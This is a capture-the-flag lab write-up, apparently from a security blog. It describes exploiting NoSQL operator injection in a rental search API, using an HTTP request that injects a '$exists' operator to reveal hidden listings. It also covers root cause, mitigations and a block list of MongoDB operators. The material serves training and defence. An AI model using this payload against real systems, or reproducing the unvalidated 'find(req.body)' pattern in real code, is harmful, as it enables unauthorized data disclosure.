---
title: "NoSQL Injection via Search Filter Object Leads to Hidden Rental Disclosure | SwiftSearch Hotels"
date: 2026-06-03 03:00:00 +0530
categories: [A05 - Injection, NoSQL Injection]
tags: [webverselabs-pro, nosql-injection, mongodb, json-injection, operator-injection, api-security]
author: Shivansh Sharma
image:
  path: /assets/images/posts/swiftsearch-hotels-nosqli.webp
  alt: NoSQL Injection via Search Filter Object Leads to Hidden Rental Disclosure
---

## Lab Link

Lab: [SwiftSearch Hotels](https://dashboard.webverselabs-pro.com/challenges/swiftsearch)

---

## Overview

SwiftSearch Hotels is a hotel and rental booking platform that recently migrated its search functionality to a JSON-based API. Instead of relying on traditional query parameters, the frontend constructs a filter object that is submitted directly to the backend search endpoint.

During testing, the application was found to accept user-controlled JSON operators without enforcing a strict schema. Because filter objects were passed directly into the backend query logic, it became possible to inject NoSQL operators and alter search behavior.

By abusing MongoDB-style query operators, hidden rental listings could be retrieved, exposing information that should not have been available to normal users.

---

## Objective

Exploit the rental search API to bypass filtering controls and access hidden rental listings containing the flag.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── NoSQL Injection
    └── Operator Injection
        └── User-Controlled Search Filter Object
```

---

## Reconnaissance

Navigate to the rentals section:

```text
/rentals
```

Inspect the application's requests using Burp Suite.

The search functionality submits requests to:

```http
POST /api/rentals/search HTTP/2
```

A default search request appears as:

```json
{
  "min_nights": {
    "$lte": 4
  },
  "nights": 4
}
```

The presence of MongoDB-style operators such as:

```json
{
  "$lte": 4
}
```

suggests that user input may be incorporated directly into a NoSQL query.

---

## Analyzing the Response

Reviewing search results reveals an interesting property:

```json
{
  "hidden": false
}
```

This indicates that listings can be marked as hidden.

A natural next step is to determine whether hidden listings can be queried directly.

---

## Testing Hidden Listings

The initial attempt adds the field:

```json
{
  "min_nights": {
    "$lte": 4
  },
  "nights": 4,
  "hidden": true
}
```

The response remains unchanged.

This suggests that the application may not be performing a direct equality check against the field.

---

## Identifying NoSQL Operator Injection

The request already demonstrates support for MongoDB operators through:

```json
{
  "$lte": 4
}
```

Because the backend accepts operator objects, additional operators become viable attack vectors.

Instead of supplying a Boolean value, inject a query operator:

```json
{
  "min_nights": {
    "$lte": 4
  },
  "nights": 4,
  "hidden": {
    "$exists": true
  }
}
```

---

## Exploitation

Modified request:

```http
POST /api/rentals/search HTTP/2
Content-Type: application/json

{
  "min_nights": {
    "$lte": 4
  },
  "nights": 4,
  "hidden": {
    "$exists": true
  }
}
```

The injected operator changes how the backend evaluates the query.

Instead of filtering for visible rentals, the search now matches documents where the field exists.

As a result, hidden listings become visible.

---

## Successful Data Disclosure

The response now contains hidden rental entries that were previously excluded from search results.

One of the hidden records contains:

```text
WEBVERSE{.....}
```

The flag is successfully disclosed through the manipulated NoSQL query.

---

## Flag

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

Original request:

```json
{
  "min_nights": {
    "$lte": 4
  },
  "nights": 4
}
```

Discovered field:

```json
{
  "hidden": false
}
```

Injected query:

```json
{
  "hidden": {
    "$exists": true
  }
}
```

Result:

```text
Hidden rental listings returned
```

Flag:

```text
WEBVERSE{.....}
```

---

## Root Cause Analysis

The application trusts user-supplied JSON filter objects and passes them directly into backend query logic.

A vulnerable implementation would resemble:

```javascript
db.rentals.find(req.body);
```

Because the request body is used directly as a query object, attackers can inject NoSQL operators such as:

```json
{
  "$exists": true
}
```

to alter query behavior.

The absence of strict schema validation allows attackers to supply arbitrary operators that were never intended to be accessible through the frontend.

---

## Impact

An attacker can:

* Bypass application filtering logic
* Access hidden records
* Enumerate sensitive data
* Retrieve restricted listings
* Manipulate backend query behavior

In real-world applications, NoSQL Injection frequently leads to unauthorized access to confidential records and internal application data.

---

## Mitigation

### Enforce Strict Schema Validation

Only allow expected field types.

Example:

```javascript
{
  nights: Number,
  min_nights: Number
}
```

Reject objects where primitive values are expected.

---

### Block Query Operators

Disallow user-supplied operators such as:

```text
$exists
$ne
$gt
$gte
$lt
$lte
$regex
$where
```

unless explicitly required.

---

### Build Queries Server-Side

Instead of:

```javascript
db.rentals.find(req.body);
```

Use:

```javascript
db.rentals.find({
  nights: req.body.nights,
  min_nights: {
    $lte: req.body.min_nights
  }
});
```

---

### Apply Access Controls

Hidden records should never be returned solely based on client-controlled filters.

---

## Real-World Insight

NoSQL Injection vulnerabilities became increasingly common as applications moved toward JSON-based APIs and document databases such as MongoDB.

Developers frequently assume that JSON data structures are inherently safe, but operator injection can completely alter backend query logic.

Commonly abused operators include:

```text
$exists
$ne
$regex
$where
$gt
$lt
```

The SwiftSearch Hotels challenge demonstrates a critical security principle:

**User input should describe search criteria, not control database query operators.**
